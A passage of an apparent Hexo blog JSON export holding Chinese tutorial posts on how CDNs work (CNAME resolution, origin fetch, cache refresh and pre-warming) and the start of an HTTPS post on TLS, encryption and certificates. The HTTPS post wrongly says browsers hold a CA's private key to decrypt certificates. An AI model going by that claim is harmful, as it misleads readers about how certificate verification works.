用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。\n\n![CDN 网络基本组件](https://pic4.zhimg.com/80/v2-7d4409a2d13943df2ca9c15defaec8c6_720w.jpg)\n\n## 2. 优点\n1. 实现跨运营商、跨地域的全网覆盖\n2. 保障网站安全、增强可靠性，防止网络攻击\n3. 异地备份\n4. 节约成本投入（人力、财力）\n\n> 当网站更新时，如果 CDN 节点上数据没有及时更新，即便用户再浏览器使用 `Ctrl +F5` 的方式使浏览器端的缓存失效，也会因为 CDN 边缘节点没有同步最新数据而导致用户访问异常\n\n## 3. 应用场景\n1. 网站站点/应用加速\n2. 视音频点播/大文件下载分发加速\n3. 移动应用加速\n\n**CDN 执行响应的基本流程**：用户的请求到达边缘服务器时，如果发现可用的缓存，则直接以缓存的内容响应，称为**命中缓存**，否则，请求将在 CDN 内部上行，直到命中合适的缓存或抵达内容网站自有的服务器，由其进行响应，称为**回源**，**源服务器** 处理完回源请求后，其响应将循原路返回，途中，CDN 各级节点将按照约定的方式对其进行缓存，以备下次使用。这是 。\n\n\n## 4. 常见操作\n\n### 4.1 CDN 回源\n\n常规的 CDN 都是回源的。即当有用户访问某一个 URL 的时候，如果被解析到的那个 CDN 节点没有缓存响应的内容，或者是缓存已经到期，就会回源站去获取。如果没有人访问，那么 CDN 节点不会主动去源站拿的。\n\n> 源站内容有更新的时候，源站主动把内容推送到 CDN 节点\n\n### 4.2 缓存刷新\n**缓存刷新**是指淘汰 CDN 节点上的旧文件，重新获取文件的新版本\n\nCDN 节点缓存的资源没有过期，但是基于客户的业务要求，需要更新CDN节点上缓存资源，刷新就是强制删除CDN节点缓存内容。用户请求这些资源时，CDN 节点需要重新回源拉取资源，保证响应的资源与源站一致。\n\n刷新类型分为**目录刷新**和**URL刷新**。URL刷新是直接将节点上缓存的资源删除。对于目录刷新，会将节点上的文件资源过期，会同源站对比 Last-Modified 时间\n\n### 4.3 缓存预热\n**缓存预热**是指首次发布的文件，主动从源站推送到 CDN，让用户访问到 CDN 时不用回客户的源站命中。\n\n正常情况下，首批下载的用户体验很差，因为都集中访问源站主机，源站主机的CPU利用率和带宽会跑的很高。第一批用户下载完成后，CDN 中也能够缓存了一份，第二批用户下载就直接在 CDN 中命中，速度比第一批快得多\n\n通过预热功能，将资源从源站推送到各 CDN 节点，提前先缓存起来。等正式使用时第一批用户也能从 CDN 中快速获取到资源\n\n\n## 5. 常见名称\n**A记录**：是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的 web server 上。\n\n**CNAME记录**：即：`别名记录`，这种记录允许您将多个名字映射到另外一个域名。\n\n**Origin Server**：即源站，是 CDN 之前的客户真正的服务器。\n\n**CDN 节点**：也称作边缘节点、Cache节点等，是相对于网络的复杂结构而提出的一个概念，指距离最终用户接入具有较少的中间环节的网络节点，对最终接入用户有较好的响应能力和连接速度。其作用是将访问量较大的网页内容和对象保存在服务器前端的专用cache设备上，以此来提高网站访问的速度和质量。\n\n> 用户向浏览器提供要访问的域名，浏览器对域名进行解析，由于 CDN 参与后，对域名解析过程进行了调整，解析的结果不再一个IP地址，而是该域名对应的 CNAME 。但 CNAME 无法完成最终内容的获取，所以，浏览器需要再次对获得的 CNAME 进行解析，以得到实际的 IP 地址。在此过程中，CDN会根据用户的实际地理位置信息解析对应的 IP 地址，使得用户能就近访问。这个过程中， CNAME的主要作用是配合CDN的负载均衡系统将CNAME背后对应的节点IP分配给不同的用户去访问。","source":"_posts/HTTP/CDN.md","raw":"---\ntitle: CDN\ncategories: HTTP\ntags: [HTTP]\ndate: 2021-01-14 15:38:00\n---\n\n# CDN\n\n## 1. 基本原理\n\nCDN 是将源站内容分发至最接近用户的节点，使用户可就近取得所需内容，提高用户访问的响应速度和成功率。解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。\n\n最简单的CDN 网络由一个 DNS 服务器和几台缓存服务器组成：\n1. 当用户点击网站页面上的内容URL，经过本地 DNS 系统解析， DNS 系统会最终将域名的解析权交给CNAME指向的CDN 专用 DNS 服务器。\n2. CDN 的 DNS 服务器将CDN 的全局负载均衡设备 IP 地址返回用户。\n3. 用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求。\n4. CDN 全局负载均衡设备根据用户IP地址，以及用户请求的内容URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求。\n5. 区域负载均衡设备会为用户选择一台合适的缓存服务器提供服务，选择的依据包括：根据用户IP地址，判断哪一台服务器距用户最近；根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容；查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。基于以上这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的 IP 地址。\n6. 全局负载均衡设备把服务器的IP地址返回给用户。\n7. 用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。\n\n![CDN 网络基本组件](https://pic4.zhimg.com/80/v2-7d4409a2d13943df2ca9c15defaec8c6_720w.jpg)\n\n## 2. 优点\n1. 实现跨运营商、跨地域的全网覆盖\n2. 保障网站安全、增强可靠性，防止网络攻击\n3. 异地备份\n4. 节约成本投入（人力、财力）\n\n> 当网站更新时，如果 CDN 节点上数据没有及时更新，即便用户再浏览器使用 `Ctrl +F5` 的方式使浏览器端的缓存失效，也会因为 CDN 边缘节点没有同步最新数据而导致用户访问异常\n\n## 3. 应用场景\n1. 网站站点/应用加速\n2. 视音频点播/大文件下载分发加速\n3. 移动应用加速\n\n**CDN 执行响应的基本流程**：用户的请求到达边缘服务器时，如果发现可用的缓存，则直接以缓存的内容响应，称为**命中缓存**，否则，请求将在 CDN 内部上行，直到命中合适的缓存或抵达内容网站自有的服务器，由其进行响应，称为**回源**，**源服务器** 处理完回源请求后，其响应将循原路返回，途中，CDN 各级节点将按照约定的方式对其进行缓存，以备下次使用。这是 。\n\n\n## 4. 常见操作\n\n### 4.1 CDN 回源\n\n常规的 CDN 都是回源的。即当有用户访问某一个 URL 的时候，如果被解析到的那个 CDN 节点没有缓存响应的内容，或者是缓存已经到期，就会回源站去获取。如果没有人访问，那么 CDN 节点不会主动去源站拿的。\n\n> 源站内容有更新的时候，源站主动把内容推送到 CDN 节点\n\n### 4.2 缓存刷新\n**缓存刷新**是指淘汰 CDN 节点上的旧文件，重新获取文件的新版本\n\nCDN 节点缓存的资源没有过期，但是基于客户的业务要求，需要更新CDN节点上缓存资源，刷新就是强制删除CDN节点缓存内容。用户请求这些资源时，CDN 节点需要重新回源拉取资源，保证响应的资源与源站一致。\n\n刷新类型分为**目录刷新**和**URL刷新**。URL刷新是直接将节点上缓存的资源删除。对于目录刷新，会将节点上的文件资源过期，会同源站对比 Last-Modified 时间\n\n### 4.3 缓存预热\n**缓存预热**是指首次发布的文件，主动从源站推送到 CDN，让用户访问到 CDN 时不用回客户的源站命中。\n\n正常情况下，首批下载的用户体验很差，因为都集中访问源站主机，源站主机的CPU利用率和带宽会跑的很高。第一批用户下载完成后，CDN 中也能够缓存了一份，第二批用户下载就直接在 CDN 中命中，速度比第一批快得多\n\n通过预热功能，将资源从源站推送到各 CDN 节点，提前先缓存起来。等正式使用时第一批用户也能从 CDN 中快速获取到资源\n\n\n## 5. 常见名称\n**A记录**：是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的 web server 上。\n\n**CNAME记录**：即：`别名记录`，这种记录允许您将多个名字映射到另外一个域名。\n\n**Origin Server**：即源站，是 CDN 之前的客户真正的服务器。\n\n**CDN 节点**：也称作边缘节点、Cache节点等，是相对于网络的复杂结构而提出的一个概念，指距离最终用户接入具有较少的中间环节的网络节点，对最终接入用户有较好的响应能力和连接速度。其作用是将访问量较大的网页内容和对象保存在服务器前端的专用cache设备上，以此来提高网站访问的速度和质量。\n\n> 用户向浏览器提供要访问的域名，浏览器对域名进行解析，由于 CDN 参与后，对域名解析过程进行了调整，解析的结果不再一个IP地址，而是该域名对应的 CNAME 。但 CNAME 无法完成最终内容的获取，所以，浏览器需要再次对获得的 CNAME 进行解析，以得到实际的 IP 地址。在此过程中，CDN会根据用户的实际地理位置信息解析对应的 IP 地址，使得用户能就近访问。这个过程中， CNAME的主要作用是配合CDN的负载均衡系统将CNAME背后对应的节点IP分配给不同的用户去访问。","slug":"HTTP/CDN","published":1,"updated":"2021-04-30T07:19:28.147Z","_id":"cko3zifiq000vmi6rcjcb3gn0","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"CDN\"><a href=\"#CDN\" class=\"headerlink\" title=\"CDN\"></a>CDN</h1><h2 id=\"1-基本原理\"><a href=\"#1-基本原理\" class=\"headerlink\" title=\"1. 基本原理\"></a>1. 基本原理</h2><p>CDN 是将源站内容分发至最接近用户的节点，使用户可就近取得所需内容，提高用户访问的响应速度和成功率。解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。</p>\n<p>最简单的CDN 网络由一个 DNS 服务器和几台缓存服务器组成：</p>\n<ol>\n<li>当用户点击网站页面上的内容URL，经过本地 DNS 系统解析， DNS 系统会最终将域名的解析权交给CNAME指向的CDN 专用 DNS 服务器。</li>\n<li>CDN 的 DNS 服务器将CDN 的全局负载均衡设备 IP 地址返回用户。</li>\n<li>用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求。</li>\n<li>CDN 全局负载均衡设备根据用户IP地址，以及用户请求的内容URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求。</li>\n<li>区域负载均衡设备会为用户选择一台合适的缓存服务器提供服务，选择的依据包括：根据用户IP地址，判断哪一台服务器距用户最近；根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容；查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。基于以上这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的 IP 地址。</li>\n<li>全局负载均衡设备把服务器的IP地址返回给用户。</li>\n<li>用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。</li>\n</ol>\n<p><img src=\"https://pic4.zhimg.com/80/v2-7d4409a2d13943df2ca9c15defaec8c6_720w.jpg\" alt=\"CDN 网络基本组件\"></p>\n<h2 id=\"2-优点\"><a href=\"#2-优点\" class=\"headerlink\" title=\"2. 优点\"></a>2. 优点</h2><ol>\n<li>实现跨运营商、跨地域的全网覆盖</li>\n<li>保障网站安全、增强可靠性，防止网络攻击</li>\n<li>异地备份</li>\n<li>节约成本投入（人力、财力）</li>\n</ol>\n<blockquote>\n<p>当网站更新时，如果 CDN 节点上数据没有及时更新，即便用户再浏览器使用 <code>Ctrl +F5</code> 的方式使浏览器端的缓存失效，也会因为 CDN 边缘节点没有同步最新数据而导致用户访问异常</p>\n</blockquote>\n<h2 id=\"3-应用场景\"><a href=\"#3-应用场景\" class=\"headerlink\" title=\"3. 应用场景\"></a>3. 应用场景</h2><ol>\n<li>网站站点/应用加速</li>\n<li>视音频点播/大文件下载分发加速</li>\n<li>移动应用加速</li>\n</ol>\n<p><strong>CDN 执行响应的基本流程</strong>：用户的请求到达边缘服务器时，如果发现可用的缓存，则直接以缓存的内容响应，称为<strong>命中缓存</strong>，否则，请求将在 CDN 内部上行，直到命中合适的缓存或抵达内容网站自有的服务器，由其进行响应，称为<strong>回源</strong>，<strong>源服务器</strong> 处理完回源请求后，其响应将循原路返回，途中，CDN 各级节点将按照约定的方式对其进行缓存，以备下次使用。这是 。</p>\n<h2 id=\"4-常见操作\"><a href=\"#4-常见操作\" class=\"headerlink\" title=\"4. 常见操作\"></a>4. 常见操作</h2><h3 id=\"4-1-CDN-回源\"><a href=\"#4-1-CDN-回源\" class=\"headerlink\" title=\"4.1 CDN 回源\"></a>4.1 CDN 回源</h3><p>常规的 CDN 都是回源的。即当有用户访问某一个 URL 的时候，如果被解析到的那个 CDN 节点没有缓存响应的内容，或者是缓存已经到期，就会回源站去获取。如果没有人访问，那么 CDN 节点不会主动去源站拿的。</p>\n<blockquote>\n<p>源站内容有更新的时候，源站主动把内容推送到 CDN 节点</p>\n</blockquote>\n<h3 id=\"4-2-缓存刷新\"><a href=\"#4-2-缓存刷新\" class=\"headerlink\" title=\"4.2 缓存刷新\"></a>4.2 缓存刷新</h3><p><strong>缓存刷新</strong>是指淘汰 CDN 节点上的旧文件，重新获取文件的新版本</p>\n<p>CDN 节点缓存的资源没有过期，但是基于客户的业务要求，需要更新CDN节点上缓存资源，刷新就是强制删除CDN节点缓存内容。用户请求这些资源时，CDN 节点需要重新回源拉取资源，保证响应的资源与源站一致。</p>\n<p>刷新类型分为<strong>目录刷新</strong>和<strong>URL刷新</strong>。URL刷新是直接将节点上缓存的资源删除。对于目录刷新，会将节点上的文件资源过期，会同源站对比 Last-Modified 时间</p>\n<h3 id=\"4-3-缓存预热\"><a href=\"#4-3-缓存预热\" class=\"headerlink\" title=\"4.3 缓存预热\"></a>4.3 缓存预热</h3><p><strong>缓存预热</strong>是指首次发布的文件，主动从源站推送到 CDN，让用户访问到 CDN 时不用回客户的源站命中。</p>\n<p>正常情况下，首批下载的用户体验很差，因为都集中访问源站主机，源站主机的CPU利用率和带宽会跑的很高。第一批用户下载完成后，CDN 中也能够缓存了一份，第二批用户下载就直接在 CDN 中命中，速度比第一批快得多</p>\n<p>通过预热功能，将资源从源站推送到各 CDN 节点，提前先缓存起来。等正式使用时第一批用户也能从 CDN 中快速获取到资源</p>\n<h2 id=\"5-常见名称\"><a href=\"#5-常见名称\" class=\"headerlink\" title=\"5. 常见名称\"></a>5. 常见名称</h2><p><strong>A记录</strong>：是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的 web server 上。</p>\n<p><strong>CNAME记录</strong>：即：<code>别名记录</code>，这种记录允许您将多个名字映射到另外一个域名。</p>\n<p><strong>Origin Server</strong>：即源站，是 CDN 之前的客户真正的服务器。</p>\n<p><strong>CDN 节点</strong>：也称作边缘节点、Cache节点等，是相对于网络的复杂结构而提出的一个概念，指距离最终用户接入具有较少的中间环节的网络节点，对最终接入用户有较好的响应能力和连接速度。其作用是将访问量较大的网页内容和对象保存在服务器前端的专用cache设备上，以此来提高网站访问的速度和质量。</p>\n<blockquote>\n<p>用户向浏览器提供要访问的域名，浏览器对域名进行解析，由于 CDN 参与后，对域名解析过程进行了调整，解析的结果不再一个IP地址，而是该域名对应的 CNAME 。但 CNAME 无法完成最终内容的获取，所以，浏览器需要再次对获得的 CNAME 进行解析，以得到实际的 IP 地址。在此过程中，CDN会根据用户的实际地理位置信息解析对应的 IP 地址，使得用户能就近访问。这个过程中， CNAME的主要作用是配合CDN的负载均衡系统将CNAME背后对应的节点IP分配给不同的用户去访问。</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"CDN\"><a href=\"#CDN\" class=\"headerlink\" title=\"CDN\"></a>CDN</h1><h2 id=\"1-基本原理\"><a href=\"#1-基本原理\" class=\"headerlink\" title=\"1. 基本原理\"></a>1. 基本原理</h2><p>CDN 是将源站内容分发至最接近用户的节点，使用户可就近取得所需内容，提高用户访问的响应速度和成功率。解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。</p>\n<p>最简单的CDN 网络由一个 DNS 服务器和几台缓存服务器组成：</p>\n<ol>\n<li>当用户点击网站页面上的内容URL，经过本地 DNS 系统解析， DNS 系统会最终将域名的解析权交给CNAME指向的CDN 专用 DNS 服务器。</li>\n<li>CDN 的 DNS 服务器将CDN 的全局负载均衡设备 IP 地址返回用户。</li>\n<li>用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求。</li>\n<li>CDN 全局负载均衡设备根据用户IP地址，以及用户请求的内容URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求。</li>\n<li>区域负载均衡设备会为用户选择一台合适的缓存服务器提供服务，选择的依据包括：根据用户IP地址，判断哪一台服务器距用户最近；根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容；查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。基于以上这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的 IP 地址。</li>\n<li>全局负载均衡设备把服务器的IP地址返回给用户。</li>\n<li>用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。</li>\n</ol>\n<p><img src=\"https://pic4.zhimg.com/80/v2-7d4409a2d13943df2ca9c15defaec8c6_720w.jpg\" alt=\"CDN 网络基本组件\"></p>\n<h2 id=\"2-优点\"><a href=\"#2-优点\" class=\"headerlink\" title=\"2. 优点\"></a>2. 优点</h2><ol>\n<li>实现跨运营商、跨地域的全网覆盖</li>\n<li>保障网站安全、增强可靠性，防止网络攻击</li>\n<li>异地备份</li>\n<li>节约成本投入（人力、财力）</li>\n</ol>\n<blockquote>\n<p>当网站更新时，如果 CDN 节点上数据没有及时更新，即便用户再浏览器使用 <code>Ctrl +F5</code> 的方式使浏览器端的缓存失效，也会因为 CDN 边缘节点没有同步最新数据而导致用户访问异常</p>\n</blockquote>\n<h2 id=\"3-应用场景\"><a href=\"#3-应用场景\" class=\"headerlink\" title=\"3. 应用场景\"></a>3. 应用场景</h2><ol>\n<li>网站站点/应用加速</li>\n<li>视音频点播/大文件下载分发加速</li>\n<li>移动应用加速</li>\n</ol>\n<p><strong>CDN 执行响应的基本流程</strong>：用户的请求到达边缘服务器时，如果发现可用的缓存，则直接以缓存的内容响应，称为<strong>命中缓存</strong>，否则，请求将在 CDN 内部上行，直到命中合适的缓存或抵达内容网站自有的服务器，由其进行响应，称为<strong>回源</strong>，<strong>源服务器</strong> 处理完回源请求后，其响应将循原路返回，途中，CDN 各级节点将按照约定的方式对其进行缓存，以备下次使用。这是 。</p>\n<h2 id=\"4-常见操作\"><a href=\"#4-常见操作\" class=\"headerlink\" title=\"4. 常见操作\"></a>4. 常见操作</h2><h3 id=\"4-1-CDN-回源\"><a href=\"#4-1-CDN-回源\" class=\"headerlink\" title=\"4.1 CDN 回源\"></a>4.1 CDN 回源</h3><p>常规的 CDN 都是回源的。即当有用户访问某一个 URL 的时候，如果被解析到的那个 CDN 节点没有缓存响应的内容，或者是缓存已经到期，就会回源站去获取。如果没有人访问，那么 CDN 节点不会主动去源站拿的。</p>\n<blockquote>\n<p>源站内容有更新的时候，源站主动把内容推送到 CDN 节点</p>\n</blockquote>\n<h3 id=\"4-2-缓存刷新\"><a href=\"#4-2-缓存刷新\" class=\"headerlink\" title=\"4.2 缓存刷新\"></a>4.2 缓存刷新</h3><p><strong>缓存刷新</strong>是指淘汰 CDN 节点上的旧文件，重新获取文件的新版本</p>\n<p>CDN 节点缓存的资源没有过期，但是基于客户的业务要求，需要更新CDN节点上缓存资源，刷新就是强制删除CDN节点缓存内容。用户请求这些资源时，CDN 节点需要重新回源拉取资源，保证响应的资源与源站一致。</p>\n<p>刷新类型分为<strong>目录刷新</strong>和<strong>URL刷新</strong>。URL刷新是直接将节点上缓存的资源删除。对于目录刷新，会将节点上的文件资源过期，会同源站对比 Last-Modified 时间</p>\n<h3 id=\"4-3-缓存预热\"><a href=\"#4-3-缓存预热\" class=\"headerlink\" title=\"4.3 缓存预热\"></a>4.3 缓存预热</h3><p><strong>缓存预热</strong>是指首次发布的文件，主动从源站推送到 CDN，让用户访问到 CDN 时不用回客户的源站命中。</p>\n<p>正常情况下，首批下载的用户体验很差，因为都集中访问源站主机，源站主机的CPU利用率和带宽会跑的很高。第一批用户下载完成后，CDN 中也能够缓存了一份，第二批用户下载就直接在 CDN 中命中，速度比第一批快得多</p>\n<p>通过预热功能，将资源从源站推送到各 CDN 节点，提前先缓存起来。等正式使用时第一批用户也能从 CDN 中快速获取到资源</p>\n<h2 id=\"5-常见名称\"><a href=\"#5-常见名称\" class=\"headerlink\" title=\"5. 常见名称\"></a>5. 常见名称</h2><p><strong>A记录</strong>：是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的 web server 上。</p>\n<p><strong>CNAME记录</strong>：即：<code>别名记录</code>，这种记录允许您将多个名字映射到另外一个域名。</p>\n<p><strong>Origin Server</strong>：即源站，是 CDN 之前的客户真正的服务器。</p>\n<p><strong>CDN 节点</strong>：也称作边缘节点、Cache节点等，是相对于网络的复杂结构而提出的一个概念，指距离最终用户接入具有较少的中间环节的网络节点，对最终接入用户有较好的响应能力和连接速度。其作用是将访问量较大的网页内容和对象保存在服务器前端的专用cache设备上，以此来提高网站访问的速度和质量。</p>\n<blockquote>\n<p>用户向浏览器提供要访问的域名，浏览器对域名进行解析，由于 CDN 参与后，对域名解析过程进行了调整，解析的结果不再一个IP地址，而是该域名对应的 CNAME 。但 CNAME 无法完成最终内容的获取，所以，浏览器需要再次对获得的 CNAME 进行解析，以得到实际的 IP 地址。在此过程中，CDN会根据用户的实际地理位置信息解析对应的 IP 地址，使得用户能就近访问。这个过程中， CNAME的主要作用是配合CDN的负载均衡系统将CNAME背后对应的节点IP分配给不同的用户去访问。</p>\n</blockquote>\n"},{"title":"HTTPS 协议","date":"2021-01-14T07:39:00.000Z","_content":"\n# HTTPS 协议\n\n### 1、背景介绍\n\nHTTP的请求过程中，客户端与服务器之间没有任何身份确认的过程，数据全部明文传输，容易遭到黑客攻击\n\nHTTP 的主要风险如下：\n1. 窃听风险：黑客可以获知通信内容\n2. 篡改风险：黑客可以修改通信内容\n3. 冒充风险：黑客可以冒充他人身份参与通信\n\nHTTPS：（Secure Hypertext Transfer Protocol）安全超文本传输协议，它基于 HTTP 开发，用于在客户计算机和服务器之间交换信息。它使用安全套接字层 (SSL) 进行信息交换。\n\n一句话总结 HTTPS的过程：\nHTTPS 要使客户端与服务器端的通信过程得到安全保证，必须使用的对称加密算法，但是协商对称加密算法的过程，需要使用非对称加密算法来保证安全，然而直接使用非对称加密的过程本身也不安全，会有中间人篡改公钥的可能性，所以客户端与服务器不直接使用公钥，而是使用数字证书签发机构颁发的证书来保证非对称加密过程本身的安全。这样通过这些机制协商出一个对称加密算法，就此双方使用该算法进行加密解密。从而解决了客户端与服务器端之间的通信安全问题。\n\n### 2、SSL\nSSL (Secure Sockets Layer 安全套接层)，及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS 与 SSL 在传输层对网络连接进行加密。\n\nSSL协议位于 TCP/I P协议与各种应用层协议之间，为数据通讯提供安全支持。SSL协议可分为两层： SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。\n\n**特点：**\n1. 认证用户和服务器，确保数据发送到正确的客户机和服务器；\n2. 加密数据以防止数据中途被窃取；\n3. 维护数据的完整性，确保数据在传输过程中不被改变。\n\n### 3、加密算法\n\n#### 3.1 对称加密算法\n\n在对称加密算法中，数据发信方将明文（原始数据）和加密密钥一起经过特殊加密算法处理后，使其变成复杂的加密密文发送出去。收信方收到密文后，若想解读原文，则需要使用加密用过的密钥及相同算法的逆算法对密文进行解密，才能使其恢复成可读明文。\n\n> 在对称加密算法中，使用的密钥只有一个，发收信双方都使用这个密钥对数据进行加密和解密，这就要求解密方事先必须知道加密 **密钥** 和 **加密算法**。\n\n特点：加密强度大，难以破解，加密解密速度快\n\n常见的对称加密算法：**AES** 、**RC4** 、**3DES**\n\n#### 3.2 非对称加密算法\n\n非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。\n\n> * 如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；\n> * 如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密；\n\n特点：性能较低，但是安全性超强\n\n常见的非对称加密算法：**RSA** 、**DSA/DSS**、 **DH** 、、RSA、DSA、ECDSA、 DH\n\n#### 3.3 Hash 算法\n\n说明：将任意长度的信息转换为较短的固定长度的值，通常其长度要比信息小得多，且算法不可逆。\n\n常见的 hash 算法：**MD5**、**SHA-1**、**SHA-2**、**SHA-256**\n\n\n**结论：** \n**非对称算法** 强度复杂、安全性依赖于算法与密钥但是由于其 **算法复杂**，而使得加密解密速度没有对称加密解密的速度快，公钥加密目前只能用来作 **密钥交换** 或者 **内容签名**，**不适合用来做应用层传输内容的加解密会话密钥客户端在认证完服务器**。获得服务器的公钥之后，利用该公钥与服务器进行加密通信，协商出两个会话密钥，分别是用于加密客户端往服务端发送数据的客户端会话密钥，和用于加密服务端往客户端发送数据的服务端会话密钥。在已有服务器公钥，可以加密通讯的前提下，还要协商两个对称密钥的原因，是因为非对称加密相对复杂度更高，**在数据传输过程中，使用对称加密，可以节省计算资源**。另外，会话密钥是随机生成，每次协商都会有不一样的结果，所以安全性也比较高。\n\n\n**使用场景：** \n* 甲方生成一对密钥并将其中的公用密钥公开；得到该公用密钥的乙方使用该密钥对机密信息进行加密后再发送给甲方；甲方再用自己保存的另一把专用密钥对加密后的信息进行解密。\n* 甲方可以使用乙方的公钥对机密信息进行签名后再发送给乙方；乙方再用自己的私匙对数据进行验签。\n\n### 4、数据加密的方式\n\n##### 方式 1：**使用对称加密**\n* 客户端发送给服务器的数据使用 **对称秘钥** 加密，服务器使用 **对称秘钥** 解密\n* 服务器发送给客户端的数据使用 **对称秘钥** 加密，客户端使用 **对称秘钥** 解密\n\n缺点：需维护大量的秘钥、秘钥容易泄露\n\n##### 方式 2：**使用非对称加密**\n* 客户端发送给服务器的数据使用 **公钥** 加密，服务器使用 **私钥** 解密\n* 服务器发送给客户端的数据使用 **私钥** 加密，客户端使用 **公钥** 解密\n\n缺点：公钥是公开的，服务器发送给客户端的数据的数据容易被截获\n\n##### 方式 3：**同时使用对称加密、非对称加密**\n* 客户端发送给服务器的 **对称加密算法、对称秘钥** 使用 **公钥** 加密\n* 服务器发送给客户端的数据用此 **对称加密算法、对称秘钥** 加密，**对称秘钥** 协商完成\n* 客户端发送给服务器的数据使用 **协商的对称秘钥** 加密，服务器使用 **协商的对称秘钥** 解密\n* 服务器发送给的客户端数据使用 **协商的对称秘钥** 加密，客户端使用 **协商的对称秘钥** 解密\n\n> 问题：公钥加密（非对称加密）计算量太大，如何减少耗用的时间？\n> 解决方法：每一次对话（session），客户端和服务器端都生成一个 **对话密钥**（双方协商的对称秘钥），用它来加密信息。由于 **对话密钥** 是对称加密，所以运算速度非常快，而服务器公钥只用于加密 **对话密钥** 本身，这样就减少了加密运算的消耗时间。\n\n![HTTPS 加密过程](https://www.wosign.cn/Basic/images/howsslwork_clip_image002.gif)\n\n很明显，方式 3 比较合适 HTTP 的数据加密，但依然有 **两个** 问题：\n1. 客户端如何获得公钥\n2. 如何确认服务器是真实的而不是黑客\n\n> 获取公钥的过程并不能保证安全，似乎又得重新进行一次加密的过程（先有鸡还是先有蛋的问题），So what to do...\n\n### 5、SSL 证书\n\nSSL证书，也称为服务器 SSL 证书，是遵守 SSL 协议的一种数字证书，由全球信任的证书颁发机构 (Certificate Authority，简称 CA) 验证服务器身份后颁发。将SSL证书安装在网站服务器上，可实现网站身份验证和数据加密传输双重功能。\n\nSSL 证书能同时解决了 **公钥获取** 问题和 **黑客冒充** 问题\n\n> 每种支持 HTTPS 的浏览器都内置的许多 CA 中心的公钥信息，CA 中心是浏览器开发商信任的授权机构，它为有需要的网站颁发用于验证的服务器公钥，颁发前 CA 中心应尽量确认申请者的身份，并确保颁发的服务器证书确实是由该域名使用的。<br/>\n> 至于CA中心的具体实现上，就是在创建一个新的 HTTPS 连接时，浏览器端收到服务器的签名公钥，验证签名后（除非 CA 的私钥泄漏，否则签名无法被伪造），检查证书里被签名的 cn 项（Common Name，常用名称）或 subjectAltName 项的值，由此确认对方确实是浏览器真正要访问的服务器，并确认该公钥不在 CA 机构的公开撤销列表里（例如，证书是假冒或欺诈手段获取到的）。如果所有检查都通过了，浏览器就可以用这个公钥加密信息并传回给服务器端，通过这种方式，确认只有特定的接收者才能对加密信息进行解密。\n\nSSL 证书是 CA 中心用自己 **私钥** 对申请者的信息进行加密的数据，当用户访问服务器是 SSL 证书从服务器下载到本地，然后浏览器内置了权威的 CA 中心的 **私钥**，用此 **私钥** 解密 SSL 证书中的数据，如果客户端计算出来的证书编号（使用证书中的 **签名算法** 进行计算）与证书中的证书编号相同，则验证通过。\n\n\n**SSL 证书包含的具体内容如下：**\n* Version 版本\n* Serial Number序列号\n* Algorithm ID 算法标识\n* Issuer 颁发者\n* Validity 有效期\n* Not Before 有效起始日期\n* Not After 有效终止日期\n* Subject 使用者\n* Subject Public Key Info 使用者公钥信息\n* Public Key Algorithm公钥算法\n* Subject Public Key公钥\n* Issuer Unique Identifier (Optional) 颁发者唯一标识（CA 中心）\n* Subject Unique Identifier (Optional) 使用者唯一标识\n* Extensions (Optional) 扩展\n* ...\n* Certificate Signature Algorithm 证书签名算法（MD5 算法）\n* Certificate Signature 证书签名\n\n**验证步骤：**\n1. 